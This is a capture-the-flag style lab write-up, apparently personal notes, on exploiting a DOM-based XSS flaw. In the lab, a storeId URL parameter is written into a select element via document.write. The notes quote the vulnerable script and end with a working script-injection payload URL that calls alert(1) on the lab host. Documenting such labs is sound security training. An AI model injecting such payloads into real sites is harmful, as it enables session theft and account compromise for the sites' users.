# DOM XSS in document.write sink using source location.search inside a select element

> ************************Instructions************************
> 
> 
> This lab contains a [DOM-based cross-site scripting](../../Cross-site%20Scripting%20(XSS)/Sub_Pages/DOM-based%20XSS.md) vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.
> 
> To solve this lab, perform a [cross-site scripting](ht../../Cross-site%20Scripting%20(XSS)/Cross-site%20scripting%20(XSS).md) attack that breaks out of the select element and calls the `alert` function.
> 

Access the Home page:

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20inside%20a%20select%20element%20images/Untitled.png)

Click ************View details************ from any product → Scroll down to the end of page and click **********************Check stock**********************

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20inside%20a%20select%20element%20images/Untitled%201.png)

Inspect the page and observe that the application is using this script to handle the data:

```html
<form id="stockCheckForm" action="/product/stock" method="POST">
	<input required type="hidden" name="productId" value="2">
	<script>
		var stores = ["London","Paris","Milan"];
		var store = (new URLSearchParams(window.location.search)).get('storeId');
		document.write('<select name="storeId">');
		if(store) {
		document.write('<option selected>'+store+'</option>');
		}
		for(var i=0;i<stores.length;i++) {
			if(stores[i] === store) {
				continue;
			}
			document.write('<option>'+stores[i]+'</option>');
		}
		document.write('</select>');
	</script>
	<button type="submit" class="button">Check stock</button>
</form>
```

Open ******************************Developer Tools****************************** > Tab **************Console**************:

```jsx
> window.location.search
<- '?productId=2'
```

The URL:

```
https://0a85006a0475bd2581bcd66500f400af.web-security-academy.net/product?productId=2
```

The script above extract the `storeId` parameter from the URL (`location.search`). It then create a new option in the `select` statement for the stock using `document.write`

For testing this, click on the URL → append the `storeId` parameter at the end:

```
https://0a85006a0475bd2581bcd66500f400af.web-security-academy.net/product?productId=2&storeId=thisisDOM-bassedXSS
```

Verify that the new `storeId` value has been added into the `select` menu:

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20inside%20a%20select%20element%20images/Untitled%202.png)

To exploit this parameter (and also the ********************JavaScript********************), replace the value of the `storeId` parameter to a `script` element which calls the `alert()` function:

```
https://0a85006a0475bd2581bcd66500f400af.web-security-academy.net/product?productId=2&storeId=<script>alert(1)</script>
```

When you press `Enter`, the application would parse the value `<script>alert(1)</script>` into the `document.write` sink and then execute the `script` element:

![Untitled](DOM%20XSS%20in%20documentWrite%20sink%20using%20source%20locationSearch%20inside%20a%20select%20element%20images/Untitled%203.png)